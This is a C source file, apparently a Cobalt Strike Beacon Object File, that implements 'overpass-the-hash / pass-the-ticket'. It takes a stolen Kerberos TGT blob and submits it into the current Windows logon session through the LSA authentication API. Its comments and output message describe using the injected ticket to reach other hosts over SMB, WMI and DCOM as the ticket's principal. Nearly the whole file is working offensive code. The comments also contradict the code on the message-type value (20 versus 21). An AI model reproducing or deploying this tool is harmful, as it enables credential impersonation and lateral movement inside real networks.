/*
 * kerb_ptt.c — Submit a Kerberos TGT into the current LUID via LSA.
 *
 * Primitive: LsaCallAuthenticationPackage(KerbSubmitTicketMessage, ...).
 * Works on every Windows build because it uses the public LSA API — no
 * LSASS struct offsets, no PPL concerns (we aren't reading/writing LSASS
 * memory, just calling a documented authentication service).
 *
 * Input (packed by overpass.py):
 *   bytes  ticket_bytes      raw KRB_CRED (kirbi) blob
 *
 * The ticket is submitted to the current thread's logon session. From then
 * on, any outbound Kerberos auth from this LUID uses the submitted TGT —
 * `shell dir \\HOST\C$` by hostname works transparently as the ticket's
 * principal.
 */

#include <windows.h>
#include <ntsecapi.h>
#include <stdint.h>

extern "C" {
#include "beacon.h"

void go(char* buff, int len);

DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaConnectUntrusted(PHANDLE);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaLookupAuthenticationPackage(HANDLE, PLSA_STRING, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaCallAuthenticationPackage(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaFreeReturnBuffer(PVOID);
DECLSPEC_IMPORT NTSTATUS NTAPI SECUR32$LsaDeregisterLogonProcess(HANDLE);

DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT void*   __cdecl MSVCRT$memset(void*, int, size_t);
}

/* KERB_SUBMIT_TKT_REQUEST — layout from kerb headers, inlined so we don't
 * depend on KerbSubmitTicketMessage being in the system headers of every
 * mingw version. The MessageType value for KerbSubmitTicketMessage is 20. */
typedef enum _KERB_PROTOCOL_MESSAGE_TYPE_LITE {
    KerbSubmitTicketMessage_LITE = 21
} KERB_PROTOCOL_MESSAGE_TYPE_LITE;

typedef struct _KERB_CRYPTO_KEY_LITE {
    LONG  KeyType;
    ULONG Length;
    ULONG Offset;   /* bytes from request start to key data */
} KERB_CRYPTO_KEY_LITE;

typedef struct _KERB_SUBMIT_TKT_REQUEST_LITE {
    ULONG MessageType;             /* = KerbSubmitTicketMessage (20) */
    LUID  LogonId;                 /* 0 = current */
    ULONG Flags;
    KERB_CRYPTO_KEY_LITE Key;      /* zeroed */
    ULONG KerbCredSize;
    ULONG KerbCredOffset;
    /* then: raw KRB_CRED bytes at offset KerbCredOffset from struct start */
} KERB_SUBMIT_TKT_REQUEST_LITE;

/* 36 bytes on both x86 and x64 — guard against Key widening to a pointer. */
static_assert(sizeof(KERB_SUBMIT_TKT_REQUEST_LITE) == 36, "submit-tkt layout mismatch");

static BOOL make_lsa_string(LSA_STRING* out, const char* s)
{
    size_t n = 0;
    while (s[n]) n++;
    if (n > 0xFFFE) return FALSE;
    out->Length        = (USHORT)n;
    out->MaximumLength = (USHORT)(n + 1);
    out->Buffer        = (PCHAR)s;
    return TRUE;
}

void go(char* buff, int len)
{
    NTSTATUS status = 0, subStatus = 0;
    HANDLE   hLsa  = NULL;
    ULONG    authPkg = 0;
    LSA_STRING pkgName;
    datap    parser;
    char*    ticketBytes = NULL;
    int      ticketLen   = 0;
    KERB_SUBMIT_TKT_REQUEST_LITE* req = NULL;
    ULONG    reqSize = 0;
    PVOID    outBuf = NULL;
    ULONG    outLen = 0;

    BeaconDataParse(&parser, buff, len);
    ticketBytes = BeaconDataExtract(&parser, &ticketLen);
    if (!ticketBytes || ticketLen < 32) {
        BeaconPrintf(CALLBACK_ERROR, "overpass/ptt: ticket blob missing or too small (got %d bytes)", ticketLen);
        return;
    }

    status = SECUR32$LsaConnectUntrusted(&hLsa);
    if (status < 0 || !hLsa) {
        BeaconPrintf(CALLBACK_ERROR, "overpass/ptt: LsaConnectUntrusted 0x%08lx", status);
        return;
    }

    if (!make_lsa_string(&pkgName, "Kerberos")) {
        BeaconPrintf(CALLBACK_ERROR, "overpass/ptt: pkg name init failed");
        goto cleanup;
    }

    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &pkgName, &authPkg);
    if (status < 0) {
        BeaconPrintf(CALLBACK_ERROR, "overpass/ptt: LsaLookupAuthenticationPackage 0x%08lx", status);
        goto cleanup;
    }

    reqSize = sizeof(KERB_SUBMIT_TKT_REQUEST_LITE) + (ULONG)ticketLen;
    req = (KERB_SUBMIT_TKT_REQUEST_LITE*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, reqSize);
    if (!req) {
        BeaconPrintf(CALLBACK_ERROR, "overpass/ptt: HeapAlloc for %lu bytes failed", reqSize);
        goto cleanup;
    }

    req->MessageType     = KerbSubmitTicketMessage_LITE;
    req->Flags           = 0;
    req->Key.KeyType     = 0;
    req->Key.Length      = 0;
    req->Key.Offset      = 0;

    /* LogonId 0 = current logon session (no SeTcbPrivilege required). */
    req->LogonId.LowPart = 0;
    req->LogonId.HighPart = 0;
    req->KerbCredSize    = (ULONG)ticketLen;
    req->KerbCredOffset  = sizeof(KERB_SUBMIT_TKT_REQUEST_LITE);
    MSVCRT$memcpy((char*)req + req->KerbCredOffset, ticketBytes, (size_t)ticketLen);

    status = SECUR32$LsaCallAuthenticationPackage(
        hLsa, authPkg, req, reqSize, &outBuf, &outLen, &subStatus
    );

    if (status < 0 || subStatus < 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "overpass/ptt: LsaCallAuthenticationPackage status=0x%08lx sub=0x%08lx",
            status, subStatus);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "overpass/ptt: TGT (%d bytes) submitted to current LUID — use `klist` to verify, then run SMB/WMI/DCOM calls",
            ticketLen);
    }

    if (outBuf) SECUR32$LsaFreeReturnBuffer(outBuf);

cleanup:
    if (req)  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, req);
    if (hLsa) SECUR32$LsaDeregisterLogonProcess(hLsa);
}
